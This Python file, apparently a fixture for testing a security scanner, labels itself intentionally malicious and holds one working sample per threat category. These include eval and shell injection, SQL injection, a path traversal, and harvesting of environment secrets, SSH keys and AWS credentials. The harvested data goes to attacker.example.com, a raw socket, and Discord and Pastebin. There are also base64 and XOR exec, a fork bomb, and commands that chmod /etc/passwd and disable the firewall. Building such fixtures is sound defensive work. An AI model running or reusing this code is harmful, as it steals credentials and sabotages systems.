# Copyright 2026 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

# DEMO ONLY — This file is intentionally malicious for security scanner testing.
# All credentials are fake/example values. Do NOT use in production.

"""
Multi-vector threat demonstration script.
Triggers: command injection, data exfiltration, hardcoded secrets,
obfuscation, resource abuse, path traversal, SQL injection detections.
"""

import base64
import json
import os
import socket
import sqlite3
import subprocess

import requests

# --- Hardcoded Secrets (SECRET_AWS_KEY, SECRET_PASSWORD_VAR, SECRET_CONNECTION_STRING) ---

AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
DATABASE_PASSWORD = "super_secret_admin_password_123"
DB_CONNECTION_STRING = "postgresql://admin:s3cretP@ss@prod-db.internal:5432/maindb"


# --- Command Injection (COMMAND_INJECTION_EVAL, _OS_SYSTEM, _SHELL_TRUE) ---


def execute_user_command(user_input):
    """Evaluate arbitrary user expressions — triggers eval detection."""
    result = eval(user_input)
    return result


def run_system_command(cmd):
    """Execute OS commands — triggers os.system detection."""
    os.system(cmd)


def run_shell_command(cmd):
    """Subprocess with shell=True — triggers shell injection detection."""
    output = subprocess.check_output(cmd, shell=True)
    return output.decode()


def dynamic_exec(code_string):
    """Dynamic code execution — triggers exec detection."""
    exec(compile(code_string, "<string>", "exec"))


# --- Path Traversal (PATH_TRAVERSAL_OPEN) ---


def read_sensitive_file(filename):
    """Path traversal to read system files."""
    with open("../../etc/passwd") as f:
        return f.read()


# --- SQL Injection (SQL_INJECTION_STRING_FORMAT) ---


def lookup_user(username):
    """SQL injection via f-string formatting."""
    db = sqlite3.connect("app.db")
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query).fetchall()


# --- Data Exfiltration (DATA_EXFIL_*) ---


def harvest_environment():
    """Harvest sensitive environment variables and exfiltrate."""
    secrets = {}
    for key, value in os.environ.items():
        if any(p in key.upper() for p in ["KEY", "SECRET", "TOKEN", "PASSWORD", "API"]):
            secrets[key] = value

    payload = base64.b64encode(json.dumps(secrets).encode()).decode()
    requests.post("https://attacker.example.com/exfil", json={"data": payload})
    return secrets


def exfiltrate_via_socket():
    """Raw socket exfiltration to attacker C2."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("attacker.example.com", 4444))
    s.send(json.dumps(dict(os.environ)).encode())
    s.close()


def read_credentials():
    """Access sensitive credential files."""
    targets = [
        os.path.expanduser("~/.ssh/id_rsa"),
        os.path.expanduser("~/.aws/credentials"),
        "/etc/shadow",
        ".env",
    ]
    stolen = {}
    for path in targets:
        try:
            with open(path) as f:
                stolen[path] = f.read()
        except OSError:
            pass

    encoded = base64.b64encode(json.dumps(stolen).encode()).decode()
    requests.post("https://attacker.example.com/creds", json={"d": encoded})
    return stolen


def exfiltrate_to_discord():
    """Send stolen data to a Discord webhook — triggers tool chaining abuse."""
    data = dict(os.environ)
    requests.post(
        "https://discord.com/api/webhooks/123456/abcdef",
        json={"content": json.dumps(data)[:2000]},
    )


def exfiltrate_to_pastebin():
    """Send data to Pastebin — triggers suspicious URL detection."""
    data = json.dumps(dict(os.environ))
    requests.post("https://pastebin.com/api/api_post.php", data={"api_paste_code": data})


# --- Obfuscation (OBFUSCATION_BASE64_LARGE, OBFUSCATION_XOR_ENCODING) ---


def run_obfuscated_payload():
    """Base64-encoded payload execution."""
    encoded_payload = base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk=")
    exec(encoded_payload.decode())


def xor_decode_and_run(data, key=0x42):
    """XOR decode and execute — triggers XOR obfuscation detection."""
    decoded = bytes(b ^ key for b in data)
    exec(decoded.decode())


# --- Resource Abuse (RESOURCE_ABUSE_INFINITE_LOOP, RESOURCE_ABUSE_FORK_BOMB) ---


def denial_of_service():
    """Infinite loop to consume CPU."""
    while True:
        _ = 1 + 1


def fork_bomb():
    """Fork bomb — triggers resource abuse detection."""
    while True:
        os.fork()


def memory_bomb():
    """Large memory allocation — triggers resource abuse detection."""
    data = bytearray(1024 * 1024 * 1024 * 10)
    return data


# --- Unauthorized Tool Use (TOOL_ABUSE_SYSTEM_MODIFICATION) ---


def modify_system():
    """System modification commands."""
    os.system("chmod 777 /etc/passwd")
    os.system("chown root:root /tmp/backdoor")
    subprocess.run(["sudo", "systemctl", "disable", "firewalld"], check=False)


# --- Main orchestration ---

if __name__ == "__main__":
    harvest_environment()
    read_credentials()
    exfiltrate_via_socket()
    exfiltrate_to_discord()
    run_obfuscated_payload()
    modify_system()
